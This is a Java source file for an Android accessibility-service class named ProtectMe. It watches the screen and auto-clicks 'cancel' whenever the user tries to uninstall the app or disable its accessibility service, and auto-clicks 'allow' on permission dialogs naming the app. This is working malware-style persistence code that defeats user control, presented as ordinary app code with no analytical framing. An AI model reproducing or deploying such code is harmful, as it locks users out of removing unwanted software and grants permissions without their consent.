/**
 * 
 */
package accessibility.app;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.Acc101Service;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import utils.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ProtectMe  extends BaseAccessibilityJob {
	private static ProtectMe current;
    private ProtectMe() {
    	super(null);
    }
    public static synchronized ProtectMe getProtectMe() {
        if(current == null) {
            current = new ProtectMe();
        }
        return current;
    }
    @Override
	public void onCreateJob(Acc101Service service) {
		super.onCreateJob(service);
		EventStart();

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 
		 AccessibilityNodeInfo rootNode = event.getSource();
	     if (rootNode == null) return;
	     clickCancelUninstall(rootNode);
	     clickCancelStopAccessibility(rootNode);
	     clickPermitAccessibility(rootNode);
	}
	/*
	     * 点击取消卸载按钮；
	*/
	public boolean clickCancelUninstall(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return false;
		nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "卸载",0);
		if(nodeInfo==null){
			nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "删除", 0);
			if(nodeInfo==null)return false;
		}
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "取消", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return false;
		AccessibilityHelper.performClick(nodeInfo);
		return true;
	}
	/*
     * 点击取消停用按钮；
     */
	public void clickCancelStopAccessibility(AccessibilityNodeInfo rootNode){
		if(rootNode.getPackageName()==null)return;
		if(!rootNode.getPackageName().toString().equals(AccessibilityHelper.PACKAG_ENAME_SETTING))return;
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "停用",0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "取消", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return;
		AccessibilityHelper.performClick(nodeInfo);
		return;
	}
	/*
     * 点击允许按钮；
     */
	public void clickPermitAccessibility(AccessibilityNodeInfo rootNode){
		AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, ConfigCt.AppName,0);
		if(nodeInfo==null)return;
		nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "允许", AccessibilityHelper.WIDGET_BUTTON);
		if(nodeInfo==null)return;
		AccessibilityHelper.performClick(nodeInfo);
		return;
	}
}
